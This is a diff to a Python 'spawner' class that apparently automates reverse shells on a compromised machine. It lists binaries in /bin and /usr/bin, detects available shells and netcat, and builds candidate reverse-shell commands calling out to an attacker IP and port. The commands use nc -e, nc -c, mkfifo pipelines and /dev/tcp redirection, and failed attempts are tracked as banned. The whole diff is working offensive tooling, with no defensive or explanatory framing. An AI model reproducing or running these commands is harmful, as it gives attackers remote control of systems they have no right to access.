@@ -72,7 +72,7 @@ class spawner:
         inc = ["&",""]
         self.working_rev = ""
         num = self.num_cons
-        if len(self.banned) >= len(self.revs):
+        if len(self.banned) >= len(self.revs) * 2:
             print("NO MORE REVS LEFT")
             return
         for i in inc:
@@ -87,7 +87,7 @@ class spawner:
                     return
                 else:
                     self.banned.append(rev)
-                    if len(self.banned) >= len(self.revs):
+                    if len(self.banned) >= len(self.revs) * 2:
                         print("NO MORE REVS LEFT")
                         return
             
@@ -97,7 +97,7 @@ class spawner:
             print("ECHO FAIL SPAWNER")
         for child in self.children:
             if not child.echo_cmd_test():
-                print("ECHO FAIL", child)
+                #print("ECHO FAIL", child.conn)
                 self.children.remove(child)
 
 
@@ -134,9 +134,12 @@ class spawner:
 
     def set_rev(self):
         global new_rev
-        data = self.send_rcv("find /bin/ /usr/bin/")
+        #data = self.send_rcv("find /bin/ /usr/bin/")
+        data = self.send_rcv("ls /bin/")
+        data += self.send_rcv("ls /usr/bin/")
 
-        bins = data.split("\n")
+        #bins = data.split("\n")
+        bins = data.split()
         shells = ["bash","dash","sh","bsh","csh","ksh","zsh","pdksh","tcsh","mksh"]
         known_shells = []
         progs = {}
@@ -157,32 +160,32 @@ class spawner:
 
 
         for shell in shells:
-            sh = f"/bin/{shell}"
-            if sh in bins:
-                known_shells.append(sh)
+            #sh = f"/bin/{shell}"
+            if shell in bins:
+                known_shells.append(shell)
 
-            sh = f"/usr/bin/{shell}"
-            if sh in bins:
-                known_shells.append(sh)
+            #sh = f"/usr/bin/{shell}"
+            #if sh in bins:
+            #    known_shells.append(sh)
 
 
-        if "/usr/bin/nc" in bins:
+        if "nc" in bins:
             for sh in known_shells:
                 self.revs.append(f"nc {IP} {PORT} -e {sh} ")
                 self.revs.append(f"nc -c {sh} {IP} {PORT} ")
                 self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| {sh} -i 2>&1|nc {IP} {PORT} >/tmp/f ")
-                self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| {sh} -i 2>&1| /usr/bin/nc {IP} {PORT} >/tmp/f ")
-                self.revs.append(f"/usr/bin/nc {IP} {PORT} -e {sh} ")
-                self.revs.append(f"/usr/bin/nc -c {sh} {IP} {PORT} ")
+                self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| {sh} -i 2>&1| nc {IP} {PORT} >/tmp/f ")
+                self.revs.append(f"nc {IP} {PORT} -e {sh} ")
+                self.revs.append(f"nc -c {sh} {IP} {PORT} ")
 
-        if "/bin/nc" in bins:
-            for sh in known_shells:
-                self.revs.append(f"nc {IP} {PORT} -e {sh}")
-                self.revs.append(f"nc -c {sh} {IP} {PORT}")
-                self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc {IP} {PORT} >/tmp/f")
-                self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|/bin/nc {IP} {PORT} >/tmp/f")
-                self.revs.append(f"/bin/nc {IP} {PORT} -e {sh} ")
-                self.revs.append(f"/usr/bin/nc -c {sh} {IP} {PORT} ")
+        #if "/bin/nc" in bins:
+        #    for sh in known_shells:
+        #        self.revs.append(f"nc {IP} {PORT} -e {sh}")
+        #        self.revs.append(f"nc -c {sh} {IP} {PORT}")
+        #        self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc {IP} {PORT} >/tmp/f")
+        #        self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|/bin/nc {IP} {PORT} >/tmp/f")
+        #        self.revs.append(f"/bin/nc {IP} {PORT} -e {sh} ")
+        #        self.revs.append(f"/usr/bin/nc -c {sh} {IP} {PORT} ")
 
         for sh in known_shells:
             self.revs.append(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {sh} <&196 >&196 2>&196")
